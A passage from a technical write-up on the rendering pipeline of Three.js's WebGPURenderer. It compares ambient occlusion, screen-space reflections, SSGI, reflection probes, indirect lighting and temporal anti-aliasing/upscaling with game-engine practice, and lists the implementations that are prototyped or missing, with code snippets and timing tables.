  • The lightmap, probe grid and environment apply AO to their indirect diffuse, combined with the material's AO map as min( materialAO, gtao ).
  • The reflection probes and environment apply GTSO to their indirect specular.
  • SSR and SSGI apply neither. A screen-space hit is something the ray found, so it is already correctly occluded.
  • Behind SSGI, the diffuse sources skip AO. SSGI's coverage is the share of the hemisphere that something on screen blocks, which is the occlusion itself. The cascade already scales the lightmap or probe grid by 1 − coverage.
  • Occlusion darkens a source's color and leaves its coverage alone. Lowering an occluded probe's coverage would let the next source's unoccluded light leak into the corner.

What Three.js has. GTAO already feeds the lighting through a context, which is the pattern the indirect lighting design in Part 5 extends:

const aoPass = ao( prePassDepth, prePassNormal, camera );
scenePass.contextNode = builtinAOContext( aoPass.getTextureNode().sample( screenUV ).r );

What is missing.

  • Specular occlusion. GTAO outputs a single visibility value, and the lighting model turns it into specular occlusion with a heuristic. It does not know which directions are blocked, so metal keeps reflecting the sky inside folds. Bent normals and GTSO are up as a draft PR. The bent normal comes out of the same horizon search; the cost is an AO target that grows from one byte per pixel to four.
  • Edge-aware upsampling. Half-resolution GTAO upsampled bilinearly leaves dark outlines around objects. jointBilateralUpsample() uses the full-resolution depth and normals as guides (Kopf et al. 2007), so the result stops at the edges. It is drafted and not yet submitted; half-resolution SSR and SSGI need the same filter.
  • Bent normals from SSGINode, so that specular occlusion does not need a second pass when SSGI is on.

Screen-space reflections#

SSR has its own series, Fixing Three.js's Screen Space Reflections. This section is the summary.

What the games require. Shipped engines agree on a recipe, set out with its sources in How Games Do Screen-Space Reflections, and What Three.js Does Instead. In a cascade, SSR has to:

  1. Trace the previous frame's lit image, so the reflection exists before the frame is shaded.
  2. Trace exactly over any distance, using a Hi-Z depth pyramid.
  3. Trace at half resolution and reuse rays between pixels, which is what brings the trace under a millisecond.
  4. Output radiance and coverage, so the probes can fill what it misses.
  5. Denoise that radiance and coverage, and leave the BRDF to the material.

What Three.js has. SSRNode importance-samples the full GGX lobe with correct Fresnel, can validate and refine its hits, and its result is reprojected and accumulated over time. The trace is a fixed-step march with short rays. The three SSR examples find 98%, 82% and 46% of the hits within their own ray length, in 2 to 3 ms, and the denoiser fills the gaps from neighbouring pixels. The result is composited over the image, as in the SSR example:

const litColor = scenePassColor.rgb.add( denoisedReflections.rgb );

What is missing. All five requirements, each prototyped or in review except ray reuse.

Exact tracing. A Hi-Z pyramid is a mip chain where each texel stores the nearest depth of the four below it. The ray takes large steps through empty space at coarse levels and single-pixel steps near surfaces, so it finds every hit the depth buffer contains and has no maximum distance to tune. My implementation adds a HiZNode that builds the pyramid in a compute pass. Trace time at 1920×1080, against the fixed-step march raised to the same hit rate:

ExampleLinear march at full qualityHi-Z
ssr_mirror27.6 ms2.9 ms
ssr_stochastic13.7 ms9.2 ms
ssr_animation8.1 ms5.2 ms

That is still a ray for every pixel. Tracing at half resolution with a joint bilateral upsample is written, and ray reuse between pixels, as Frostbite does it, is still to build. Exact Screen-Space Reflections on a Budget has the full plan.

Coverage. Today a ray that misses samples an environment map inside SSR: an equirectangular texture passed in as environmentNode, which cannot be the PMREM-filtered scene.environment, let alone a local probe. Adding SSR over the image also counts the environment reflection twice. In a cascade, SSR outputs one thing: radiance premultiplied by coverage, with coverage 1 for a hit, 0 for a miss, and fading toward the screen border. The environment input and the BRDF estimate leave the node. This is prototyped as part of Pluggable Indirect Lighting for Three.js.

Tracing the previous frame. SSR cannot be part of the lighting while it reads the lighting's output. DOOM's answer is to trace the current depth buffer but read colors from the previous frame: reproject each hit point into last frame's TRAA output and sample it there. A hit that fails the check against last frame's depth gets zero coverage. Last frame's image already contained last frame's reflections, so a mirror facing a mirror gains a bounce each frame. Previous-frame tracing is in review.

The loop needs two rules. The image SSR reads must be linear HDR radiance, taken after TRAA but before tone mapping and bloom, or reflections pick up tone-mapped colors and bloom halos. And the fed-back radiance must be clamped, because each frame's reflections become the next frame's input and a single firefly compounds frame after frame.

Denoising. Three.js has two reflection denoisers. The pair the SSR example runs, TemporalReprojectNode and RecurrentDenoiseNode, reads every black pixel as missing data and fills it from its neighbours. That hides the tracer's misses and leaves nothing for the probes to answer. zalo's SVGF-based DenoiseNode replaced the pair in the SSR example and was taken back out five days later. I traced the flicker that caused it to the missing coverage: at the edge of a reflection a hit and a miss were averaged as two samples of one signal, and the history kept resetting.

My ssr-coverage branch carries coverage through every stage of DenoiseNode and takes its statistics from covered samples only. Still to do are a two-lookup history, a history cap that follows roughness, and skipping mirrors and matte pixels. The denoiser filters incoming light and the material applies its BRDF afterwards, so it needs no albedo in the G-buffer and no demodulation step. How Games Denoise Reflections, and What Three.js Does Instead has the comparison and the plan.

Screen-space global illumination#

What the games require. Engines that use SSGI as part of their lighting put it in front of their baked light as the first stage of the diffuse cascade. That means SSGI has to output coverage, trace the previous frame's lit image, and accumulate over time at half resolution.

What Three.js has. SSGINode is built on the visibility-bitmask approach of SSRT3, which extends GTAO's horizon search to gather light as well as occlusion. One search of 24 depth samples yields a GI texture and an AO texture, and it is much less noisy than a single random ray, because each sample accounts for a whole arc of directions. The SSGI example traces the current frame's beauty pass and composites over it.

What is missing.

  • Coverage output. The sectors the search marks as blocked are the directions in which it found a surface, so coverage is 1 − ao, and the node already computes it. What is missing is handing the GI and that coverage to the cascade as a pair, so SSGI can replace the baked bounce where it has an answer.
  • Previous-frame tracing. SSR reads the previous frame once per pixel, where its ray lands. SSGI reads it at every sample that finds a surface, so reprojecting at each read is paid many times per pixel. A draft measures the options on an Apple M3:
ReprojectionFrame rate cost
Every sample, by camera motion14–22%
Every sample, by per-pixel velocity32–44%
Once, by velocity, into a half-resolution buffer the search reads directlyNone measured

The third option also follows moving objects, and shows no visible artifacts in the test scenes.

Reflection probes#

What the games require. Indoors, one environment map is wrong: walk from a red room into a blue corridor and the floor should reflect red, then blue. Every game in the survey, and Unreal's reflection captures, use local reflection probes: cubemaps captured inside each room, each with a box describing the volume it influences. Inside its box a probe is box-projected, which removes most of a cubemap's parallax error (Lagarde's write-up is the classic explanation). Where boxes overlap, probes blend.

What Three.js has. CubeCamera captures a cubemap, PMREMGenerator prefilters it, and getParallaxCorrectNormal() box-projects it, as the box-projected environment map example shows. That is one probe per material, set by hand.

What is missing.

  • A probe system. Box-projected reflection probes for WebGPURenderer adds scene-level probes with influence boxes and blending, and is up as a draft PR.
  • Fast access to many probes. Cube array textures put every probe in one texture; sampling them is merged, and the texture class is in review.
  • Probe normalization. A probe is captured at one point in a room, so a dark corner or the inside of a cupboard reflects a brightly lit room. Call of Duty's fix, introduced in Black Ops II and carried into Infinite Warfare, is to scale the probe's reflection by the ratio of the diffuse light at the pixel to the diffuse light at the probe. The lightmaps and probe grid already provide both. Still to do.
  • Small probes. PMREMGenerator has a minimum size of 256². A 128² probe is enough for blurry room reflections, since SSR handles the sharp ones, and takes a quarter of the memory. Still to do.

Indirect lighting in the BRDF#

What the games require. The bounced light has to go through the material's BRDF, so Fresnel, roughness and metalness apply to it as they do to direct light. In a forward renderer the beauty pass needs two inputs:

  • Indirect diffuse: SSGI where it has coverage, then the lightmap on static meshes or the probe grid on everything else, then the environment map.
  • Indirect specular: SSR, then the box-projected probes, then the environment map.

Three.js renders forward, so SSR, SSGI and AO are computed before the beauty pass and each material reads them while it shades. Tracing the previous frame is what makes that order possible.

What Three.js has. Indirect diffuse is mostly in place: lightMap, LightProbeGrid and scene.environment all feed it, and AO reaches it through builtinAOContext. Indirect specular comes only from scene.environment, or a material's own envMap.

What is missing. A way to plug a screen-space result, or a cascade of sources, into a material's indirect specular, the way AO is plugged into its diffuse. This is the biggest gap in the pipeline, and my proposed design is in Pluggable Indirect Lighting for Three.js.

TRAA and TAAU#

What the games require. Temporal anti-aliasing whose output can also be next frame's input to SSR and SSGI, so it has to stay sharp under motion and must not feed ghosts or fireflies back into the reflections. Every engine this series measures itself against also renders below the output resolution and reconstructs the difference over time: TSR in Unreal, FSR 2 in Godot, DLSS and FSR in Cyberpunk 2077.

What Three.js has. A TRAA node with Halton jitter, motion-vector reprojection and variance clipping of the history, and TAAUNode, which follows Karis's temporal supersampling and FSR 2. The TAAU example shows it at a quarter of the pixels:

scenePass.setResolutionScale( 0.5 );

const taauNode = taau( scenePassColor, scenePassDepth, scenePassVelocity, camera );

TAAU takes TRAA's place as the last stage of the frame. Everything before it runs at the render resolution, its linear HDR output is what the next frame's SSR and SSGI read, and bloom and tone mapping run after it. At a scale of 0.5, the screen buffers at 1080p drop from about 157 MB to 81 MB.

What is missing.

  • Wider clipping at rest. Variance clipping stops ghosting by rejecting history that no longer matches the current frame, and it also rejects good history. TRAA tightens its clip box to 0.5σ under fast motion, but at rest the box was 1σ, tight enough to clip converged sub-pixel detail, so a still image never fully resolved and longer histories scored worse. A drafted change widens the box to 2σ at rest and adds a historyLength control. Against a supersampled reference:

    ViewPSNR change
    Static+2.15 dB
    Still camera, moving objects+1.3 dB
    Fast camera motionWithin 0.06 dB

  • Sharper history. History sampled bilinearly blurs a little more every frame the camera moves. Catmull-Rom history sampling, a draft PR, keeps it sharp. Both refinements apply to TAAU as well.

  • TAAU in the full pipeline. The example upscales a single scene pass. The pipeline has a prepass, half-resolution effects and a beauty pass that all have to agree on resolution and jitter, and none of that has been tried together yet. With TAAU at 0.5, half-resolution SSR and SSGI would run at a quarter of the output resolution on each axis, so it may be better to run them at the full render resolution and skip the bilateral upsample.

  • Texture mip bias. Rendering at half resolution makes the GPU pick blurrier texture mips than the output deserves. Temporal upscalers pair with a negative mip bias of about log2 of the resolution scale, and Three.js does not apply one yet.

Future work#

  • Cheaper noise. Houston Stratified Noise costs about 400 operations per sample, on every pixel, every frame. I want to move some of that into a small map generated at startup, so each sample is a lookup and a few adds.
  • Auto-exposure. Walking from a dark room into a bright courtyard needs eye adaptation, and Three.js does not have it yet.
  • A physically based sun and sky. A room lit through its windows needs a sun and sky in real units that agree with each other and with the exposure. A prototype does single scattering; multiple scattering and clouds are still to do.
  • Reflection probes in glTF. There is no standard way to ship reflection probes. The minimum is each probe's position and influence box, so a loader can capture the probes on load.
  • Directional lightmaps. The lightmaps here store one irradiance value per texel, so normal maps cannot respond to baked light. The options are an ambient term plus one dominant direction as in The Last of Us and Call of Duty, L1 spherical harmonics as in Frostbite, or spherical Gaussians as in The Order: 1886.
